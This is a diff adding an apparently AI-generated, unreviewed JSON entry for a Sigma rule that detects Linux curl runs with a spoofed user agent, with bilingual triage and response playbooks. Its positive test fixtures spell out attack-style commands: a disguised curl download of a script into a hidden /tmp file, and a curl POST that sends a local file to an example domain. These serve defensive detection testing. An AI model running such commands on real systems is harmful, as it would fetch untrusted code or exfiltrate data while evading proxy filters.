@@ -1,0 +1,132 @@
+{
+  "rule": {
+    "id": "b86d356d-6093-443d-971c-9b07db583c68",
+    "title": "Suspicious Curl Change User Agents - Linux",
+    "level": "medium",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "linux/process_creation/proc_creation_lnx_susp_curl_useragent.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/linux/process_creation/proc_creation_lnx_susp_curl_useragent.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1071.001"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso curl se ejecutó en un host Linux con la opción -A o --user-agent, que cambia el user agent de la solicitud HTTP. Puede ser una prueba legítima o un intento de ocultar tráfico de C2 o de descarga simulando un navegador.",
+      "what_it_detects": "Creación de procesos cuyo Image termina en /curl y cuyo CommandLine contiene ' -A ' o ' --user-agent '. No detecta la forma --user-agent=valor ni otras herramientas como wget.",
+      "why_it_matters": "Los atacantes falsifican el user agent para que sus descargas o su canal de comando y control se confundan con tráfico web normal y evadan filtros de proxy (ATT&CK T1071.001, protocolos web de capa de aplicación).",
+      "triage_steps": [
+        "Revise el CommandLine completo: user agent elegido, URL o IP de destino, opciones de salida (-o, -O) y si el resultado se canaliza a sh o bash.",
+        "Verifique la reputación del dominio o IP de destino y si es interno, un repositorio conocido o infraestructura desconocida.",
+        "Identifique el ParentImage y la cadena de procesos: shell interactiva, cron, servicio web, script de despliegue o binario en /tmp.",
+        "Confirme el usuario que ejecutó curl y si es habitual que use esa cuenta para tareas de red o administración.",
+        "Busque procesos hijos y archivos creados por curl en el mismo host dentro de +/- 15 minutos, sobre todo en /tmp, /dev/shm o directorios ocultos.",
+        "Correlacione con logs de proxy, DNS o firewall del mismo host y destino para ver frecuencia, beaconing y volumen transferido.",
+        "Revise alertas previas del mismo host, usuario o destino y si el mismo comando aparece en otros equipos."
+      ],
+      "false_positives": [
+        "Scripts de desarrolladores o administradores que fijan un user agent para APIs, pruebas o scraping autorizado.",
+        "Actividad administrativa manual, como depurar respuestas de un servidor web según el user agent.",
+        "Herramientas de monitoreo, health checks o pipelines CI/CD que se identifican con un user agent propio."
+      ],
+      "response_steps": [
+        "Valide con el dueño del host o del script si la ejecución es esperada; documente y ajuste la regla con exclusiones específicas si es legítima.",
+        "Si es sospechosa, aísle el host de la red y bloquee el dominio o IP de destino en proxy y firewall.",
+        "Preserve los archivos descargados, calcule su hash y analícelos antes de eliminarlos.",
+        "Busque y elimine persistencia relacionada (cron, systemd, .bashrc, claves SSH) y rote credenciales de la cuenta implicada.",
+        "Restaure el host desde una fuente confiable si se confirma compromiso y monitoree el destino en toda la flota."
+      ],
+      "severity_rationale": "El nivel medium es adecuado porque cambiar el user agent es común en scripts legítimos, pero también es una técnica frecuente para camuflar descargas y C2, lo que exige revisión del contexto."
+    },
+    "en": {
+      "summary": "A curl process ran on a Linux host with -A or --user-agent, overriding the HTTP user agent. This may be legitimate testing or an attempt to disguise C2 or download traffic as a browser.",
+      "what_it_detects": "Process creation where Image ends with /curl and CommandLine contains ' -A ' or ' --user-agent '. It does not catch the --user-agent=value form or other tools such as wget.",
+      "why_it_matters": "Attackers spoof user agents so payload downloads or command-and-control traffic blend with normal web browsing and slip past proxy filters (ATT&CK T1071.001, application layer protocol: web protocols).",
+      "triage_steps": [
+        "Read the full CommandLine: chosen user agent, destination URL or IP, output options (-o, -O) and whether output is piped to sh or bash.",
+        "Check the destination domain or IP reputation: internal service, known repository or unknown infrastructure.",
+        "Identify ParentImage and the process chain: interactive shell, cron, web server, deployment script or a binary in /tmp.",
+        "Confirm which user ran curl and whether that account normally performs network or admin tasks.",
+        "Look for child processes and files written by curl on the same host within +/- 15 minutes, especially in /tmp, /dev/shm or hidden directories.",
+        "Correlate with proxy, DNS or firewall logs for the same host and destination to spot beaconing and transfer volume.",
+        "Review earlier alerts for the same host, user or destination, and whether the same command appears on other hosts."
+      ],
+      "false_positives": [
+        "Developer or admin scripts that set a user agent for APIs, testing or authorized scraping.",
+        "Manual administrative work, such as debugging web server responses per user agent.",
+        "Monitoring tools, health checks or CI/CD pipelines that identify themselves with a custom user agent."
+      ],
+      "response_steps": [
+        "Confirm with the host or script owner whether this is expected; if legitimate, document it and add a narrow exclusion.",
+        "If suspicious, isolate the host and block the destination domain or IP at the proxy and firewall.",
+        "Preserve downloaded files, record their hashes and analyze them before deletion.",
+        "Hunt for and remove related persistence (cron, systemd, .bashrc, SSH keys) and rotate credentials for the involved account.",
+        "Rebuild the host from a trusted source if compromise is confirmed and watch for the destination across the fleet."
+      ],
+      "severity_rationale": "Medium fits because changing the user agent is common in legitimate scripts but is also a frequent way to camouflage downloads and C2, so context review is required."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "curl launched from a shell with -A spoofing a browser user agent, downloading a script from an external IP into /tmp",
+        "event": {
+          "Image": "/usr/bin/curl",
+          "CommandLine": "curl -s -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' http://203.0.113.45/update.sh -o /tmp/.update.sh",
+          "ParentImage": "/bin/bash",
+          "User": "www-data",
+          "ProcessId": 48213,
+          "CurrentDirectory": "/var/www/html",
+          "Computer": "web-02"
+        }
+      },
+      {
+        "description": "curl using the long --user-agent option to POST data to an example domain from a cron job",
+        "event": {
+          "Image": "/usr/bin/curl",
+          "CommandLine": "/usr/bin/curl --user-agent \"Googlebot/2.1\" -X POST -d @/tmp/out.txt https://cdn.example.com/collect",
+          "ParentImage": "/usr/sbin/cron",
+          "User": "jperez",
+          "ProcessId": 51007,
+          "CurrentDirectory": "/home/jperez",
+          "Computer": "bastion-01"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Routine curl API call with custom headers but no user agent option",
+        "event": {
+          "Image": "/usr/bin/curl",
+          "CommandLine": "curl -sS -H 'Accept: application/json' https://api.example.org/v1/status",
+          "ParentImage": "/bin/bash",
+          "User": "deploy",
+          "ProcessId": 39120,
+          "CurrentDirectory": "/opt/app",
+          "Computer": "app-01"
+        }
+      },
+      {
+        "description": "wget with --user-agent; the Image does not end with /curl, so the rule does not match",
+        "event": {
+          "Image": "/usr/bin/wget",
+          "CommandLine": "wget --user-agent 'Mozilla/5.0' https://downloads.example.com/package.tar.gz",
+          "ParentImage": "/bin/bash",
+          "User": "jperez",
+          "ProcessId": 40211,
+          "CurrentDirectory": "/home/jperez",
+          "Computer": "bastion-01"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:55:13+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
